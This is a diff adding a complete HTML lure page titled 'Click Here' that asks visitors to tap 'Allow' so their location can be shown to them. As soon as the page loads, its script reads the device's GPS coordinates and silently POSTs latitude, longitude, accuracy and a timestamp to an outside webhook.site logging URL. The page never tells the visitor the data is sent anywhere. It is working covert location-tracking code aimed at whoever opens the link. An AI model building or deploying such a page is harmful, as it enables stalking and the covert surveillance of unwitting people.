@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Click Here</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #e6f7ff; /* Calming light blue */
+            color: #333;
+            text-align: center;
+        }
+        .container {
+            padding: 30px;
+            border: 1px solid #b3d9ff;
+            border-radius: 15px;
+            background-color: white;
+            box-shadow: 0 6px 12px rgba(0,0,0,0.1);
+        }
+        h1 {
+            color: #0056b3;
+            margin-top: 0;
+        }
+        #status {
+            margin-top: 20px;
+            font-weight: bold;
+        }
+        #location-result {
+            margin-top: 20px;
+            font-family: monospace;
+            background-color: #f0f8ff;
+            padding: 10px;
+            border-radius: 5px;
+            font-size: 14px;
+        }
+        .loading {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #0056b3;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Almost There!</h1>
+        <p>Please tap "Allow" on the next screen to show your location.</p>
+        <div id="status"><div class="loading"></div> Waiting for location...</div>
+        <div id="location-result"></div>
+    </div>
+    <script>
+        window.onload = function() {
+            const statusDiv = document.getElementById('status');
+            const resultDiv = document.getElementById('location-result');
+
+            if (navigator.geolocation) {
+                // Automatically request location on page load
+                navigator.geolocation.getCurrentPosition(showPosition, showError);
+            } else {
+                statusDiv.textContent = "Location is not available on this device.";
+            }
+        };
+
+        function showPosition(position) {
+            const statusDiv = document.getElementById('status');
+            const resultDiv = document.getElementById('location-result');
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+            const accuracy = position.coords.accuracy;
+
+            // The unique Webhook.site URL provided by the user - FIXED
+            const loggingURL = 'https://webhook.site/acfd66d5-a7e7-47e1-9d4b-5b630475a52c';
+
+            // Template literals cleaned up
+            const locationData = `Lat: ${latitude}, Lon: ${longitude}, Accuracy: ${accuracy}m`;
+            const mapLink = `https://maps.apple.com/?q=${latitude},${longitude}`;
+
+            statusDiv.innerHTML = '<strong style="color: green;">✓ Location Found!</strong>';
+            resultDiv.innerHTML = `Your location is: ${locationData}<br><br> <a href="${mapLink}" target="_blank">View on Map</a>`;
+
+            // Send the data to your Webhook.site URL
+            fetch(loggingURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    latitude: latitude,
+                    longitude: longitude,
+                    accuracy: accuracy,
+                    timestamp: new Date().toISOString()
+                })
+            })
+            .then(response => console.log('Log sent successfully'))
+            .catch(error => console.error('Failed to send log:', error));
+        }
+
+        function showError(error) {
+            const statusDiv = document.getElementById('status');
+            switch(error.code) {
+                case error.PERMISSION_DENIED:
+                    statusDiv.innerHTML = '<strong style="color: red;">Location permission was denied.</strong>';
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    statusDiv.innerHTML = '<strong style="color: orange;">Location information is unavailable.</strong>';
+                    break;
+                case error.TIMEOUT:
+                    statusDiv.innerHTML = '<strong style="color: orange;">Location request timed out.</strong>';
+                    break;
+                default:
+                    statusDiv.innerHTML = '<strong style="color: red;">An unknown error occurred.</strong>';
+                    break;
+            }
+        }
+    </script>
+</body>
+</html>
